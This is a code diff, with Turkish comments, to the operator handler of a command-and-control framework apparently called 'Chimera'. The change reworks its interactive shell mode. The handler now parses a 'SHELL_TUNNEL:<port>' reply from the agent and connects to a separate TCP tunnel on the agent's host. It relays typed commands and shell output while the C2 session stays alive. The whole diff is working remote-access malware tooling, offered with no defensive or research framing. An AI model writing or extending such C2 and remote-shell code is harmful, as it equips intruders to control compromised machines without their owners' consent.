@@ -232,25 +232,49 @@ class Handler(BaseHandler):
             print(f"[!] Veri alma hatası: {e}")
             return ""
 
-    def start_shell_mode(self):
-        """Raw socket üzerinden shell etkileşimini yönetir."""
+    def start_shell_mode(self, tunnel_port: int):
+        """Ayrı TCP tüneli üzerinden shell etkileşimini yönetir.
+        
+        Agent tarafında açılan shell tüneline bağlanır, raw I/O yapar.
+        Shell kapanınca sadece tünel soketi kapatılır; C2 bağlantısı korunur.
+        
+        Args:
+            tunnel_port: Agent'ın açtığı shell tüneli port numarası.
+        """
         print("-" * 50)
-        print("[*] Raw Shell Moduna geçildi.")
+        print("[*] Raw Shell Moduna geçildi (Ayrı Tünel).")
         print("[*] Çıkış için 'exit' yazıp Enter'layın.")
         print("-" * 50)
         
+        # ── 1. Agent'ın shell tüneline bağlan ──────────────────────
+        # Agent'ın IP adresi = mevcut C2 bağlantısındaki peer
+        try:
+            agent_host = self.client_sock.getpeername()[0]
+        except Exception:
+            agent_host = self.lhost  # Fallback
+
+        try:
+            shell_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            shell_sock.settimeout(15)
+            shell_sock.connect((agent_host, tunnel_port))
+            shell_sock.settimeout(None)
+            print(f"[*] Shell tüneline bağlanıldı: {agent_host}:{tunnel_port}")
+        except Exception as e:
+            print(f"[!] Shell tüneline bağlanılamadı: {e}")
+            return
+        
+        # ── 2. Raw I/O: shell_sock ↔ kullanıcı terminal ───────────
         stop_event = threading.Event()
         
         def recv_loop():
-            """Socket -> STDOUT"""
+            """Shell Socket -> STDOUT"""
             while not stop_event.is_set():
                 try:
-                    if not self.client_sock: break
-                    data = self.client_sock.recv(1024)
+                    if not shell_sock: break
+                    data = shell_sock.recv(4096)
                     if not data:
                         stop_event.set()
                         break
-                    # Gelen veriyi direkt ekrana bas
                     print(data.decode('utf-8', errors='replace'), end='', flush=True)
                 except Exception:
                     stop_event.set()
@@ -261,7 +285,6 @@ class Handler(BaseHandler):
         
         try:
             while not stop_event.is_set():
-                # Kullanıcıdan veri al (sys.stdin.readline() satır bazlı okuma yapar)
                 try:
                     cmd = sys.stdin.readline()
                 except EOFError:
@@ -270,44 +293,35 @@ class Handler(BaseHandler):
                 if not cmd: break
                 
                 if cmd.strip() == "exit":
-                    # Çıkış sinyali gönder
-                    if self.client_sock:
-                        try:
-                            self.client_sock.send(b"exit_shell_mode_now")
-                        except:
-                            pass
+                    try:
+                        shell_sock.send(b"exit_shell_mode_now")
+                    except:
+                        pass
                     stop_event.set()
                     break
                 
-                # Veriyi gönder
-                if self.client_sock:
-                    try:
-                        self.client_sock.send(cmd.encode('utf-8'))
-                    except:
-                        stop_event.set()
-                        break
+                try:
+                    shell_sock.send(cmd.encode('utf-8'))
+                except:
+                    stop_event.set()
+                    break
                 
         except KeyboardInterrupt:
-            if self.client_sock:
-                try:
-                    self.client_sock.send(b"exit_shell_mode_now")
-                except:
-                    pass
-            stop_event.set()
-            
-        print("\n[*] Shell modundan çıkıldı. Bağlantı yenileniyor...")
-        # Bağlantıyı kapat (Agent reconnect atacak)
-        if self.client_sock:
             try:
-                self.client_sock.close()
+                shell_sock.send(b"exit_shell_mode_now")
             except:
                 pass
-            self.client_sock = None
-            if shared_state.session_manager and self.session_id:
-                with shared_state.session_manager.lock:
-                    if self.session_id in shared_state.session_manager.sessions:
-                        del shared_state.session_manager.sessions[self.session_id]
-            self.session_id = None # Session düştü
+            stop_event.set()
+
+        # ── 3. Temizlik — sadece shell soketini kapat ─────────────
+        print("\n[*] Shell modundan çıkıldı.")
+        try:
+            shell_sock.close()
+        except:
+            pass
+        
+        # C2 bağlantısı (self.client_sock) DOKUNULMAZ
+        # Session silinmez — chimera prompt'a doğrudan dönülür
 
 
     def interactive_session(self):
@@ -557,22 +571,23 @@ class Handler(BaseHandler):
 
                 # Shell Modu: İnteraktif shell oturumu başlat
                 if cmd_lower == "shell":
-                    # Önce "Shell başlatıldı" mesajını bekle
+                    # Agent artık SHELL_TUNNEL:<port> yanıtı gönderiyor
                     response = self.recv_data()
-                    print(response)
                     
-                    if "[+]" in response:
-                         self.start_shell_mode()
-                         # Shell modundan dönünce ajan kapatıp yeniden bağlanacaktır. Bekle:
-                         print("[*] Ajanın yeniden bağlanması bekleniyor...")
-                         import time
-                         while self.client_sock is None and getattr(self, "running", True):
-                             time.sleep(0.5)
-                         if getattr(self, "client_sock", None):
-                             print(f"[*] Bağlantı yenilendi, Chimera Session {self.session_id} olarak devam ediliyor.")
-                         continue
+                    if response and response.startswith("SHELL_TUNNEL:"):
+                        try:
+                            tunnel_port = int(response.split(":")[1])
+                            print(f"[+] Shell oturumu başlatıldı. (Tünel port: {tunnel_port})")
+                            self.start_shell_mode(tunnel_port)
+                            # Shell modundan dönünce C2 bağlantısı hâlâ ayakta
+                            # Doğrudan chimera prompt'a dön
+                        except (ValueError, IndexError) as e:
+                            print(f"[!] Shell tünel portu parse hatası: {e}")
+                    elif response:
+                        print(response)  # Hata mesajı
                     else:
-                        continue
+                        print("[!] Shell başlatma yanıtı alınamadı.")
+                    continue
                 
                 # Normal komut cevabı bekle
                 response = self.recv_data()
